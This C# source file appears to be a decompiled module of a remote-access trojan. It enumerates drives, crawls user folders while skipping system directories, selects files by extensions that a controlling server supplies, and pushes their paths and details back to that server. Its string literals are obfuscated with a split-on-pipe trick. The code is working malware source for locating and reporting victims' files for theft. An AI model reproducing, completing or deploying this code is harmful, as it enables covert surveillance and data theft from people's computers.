using System;
using System.Collections.Generic;
using System.IO;

namespace hargardius;

internal class DLRZRIVF
{
	public MLREDM iserver;

	public List<string> hargardiusfExts = new List<string>();

	public List<string> hargardiusnotFilders = new List<string>();

	public string hargardiusmainPath;

	public int hargardiussIndx = 0;

	public List<string> hargardiussFiles = new List<string>();

	public string hargardiusfilesLogs = DLAONIF.hargardiusfilesLogs;

	public int hargardiusfIndx = 0;

	public bool hargardiusreaging = false;

	public string hargardiuslookupDrives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|hargardius".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public bool hargardiusseeAccess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public DLRZRIVF()
	{
		hargardiusnotFilders.Add("msocache|hargardius".Split(new char[1] { '|' })[0]);
		hargardiusnotFilders.Add("recoveDSDF|hargardius".Split(new char[1] { '|' })[0]);
		hargardiusnotFilders.Add("documents and settings|hargardius".Split(new char[1] { '|' })[0]);
		hargardiusnotFilders.Add("program files|hargardius".Split(new char[1] { '|' })[0]);
		hargardiusnotFilders.Add("system volume information|hargardius".Split(new char[1] { '|' })[0]);
		hargardiusnotFilders.Add("$recycle.bin|hargardius".Split(new char[1] { '|' })[0]);
		hargardiusnotFilders.Add("windows|hargardius".Split(new char[1] { '|' })[0]);
		hargardiusnotFilders.Add("program files (x86)|hargardius".Split(new char[1] { '|' })[0]);
		hargardiusnotFilders.Add("programdata|hargardius".Split(new char[1] { '|' })[0]);
	}

	public IEnumerable<string> hargardiusaddFiles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.hargardiusautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (hargardiusseeAccess(text) && !hargardiusnotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void hargardiussendSearch(string path)
	{
		try
		{
			foreach (string item in hargardiusaddFiles(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (hargardiusfExts.Contains(text.ToLower()))
				{
					string text2 = iserver.hargardiusfile_info(item, ret: true);
					iserver.hargardiuspush_data(null, "hargardius-searf=|hargardius".Split(new char[1] { '|' })[0] + item + "<FILE_AUTO<|hargardius".Split(new char[1] { '|' })[0] + text2);
				}
				if (iserver.hargardiusautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string hargardiuslookupFiles(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|hargardius".Split(new char[1] { '|' })[0];
			}
		}
		else
		{
			text = null;
		}
		return text;
	}

	public string hargardiuscheckFolders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (hargardiusseeAccess(text2))
				{
					text = text + text2 + ">|hargardius".Split(new char[1] { '|' })[0];
				}
			}
			return text;
		}
		return null;
	}

	public void hargardiuslookFiles(string tempStr)
	{
		iserver.hargardiusautCnls = false;
		hargardiusfExts.Clear();
		hargardiussFiles.Clear();
		hargardiusfIndx = 0;
		hargardiussIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				hargardiusfExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			hargardiusreaging = true;
			hargardiussendSearch(array[1]);
			hargardiusreaging = false;
			iserver.hargardiuspush_data(null, "hargardius-seard=searched|hargardius".Split(new char[1] { '|' })[0]);
		}
	}
}
